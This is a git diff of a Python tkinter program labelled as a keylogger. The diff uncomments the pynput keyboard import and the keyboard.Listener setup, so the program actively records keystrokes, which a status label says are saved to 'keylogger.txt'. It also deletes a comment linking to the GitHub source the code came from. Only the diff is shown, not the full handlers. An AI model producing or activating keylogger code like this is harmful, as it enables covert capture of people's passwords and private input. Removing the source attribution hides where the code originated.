@@ -1,7 +1,7 @@
-# import pynput
+
 import tkinter as tk
 from tkinter import *
-# from pynput import keyboard
+from pynput import keyboard
 import json
 
 keys_used = []
@@ -47,7 +47,7 @@ def on_release(key):
 
 def start_keylogger():
     global listener
-    # listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
     start_button.config(state='disabled')
@@ -80,4 +80,4 @@ root.mainloop()
 
 
 
-# https://github.com/Swastika912/KeyLogger/tree/15d7e54dfdea76f787c3c60c956cb2f38d539e64
+
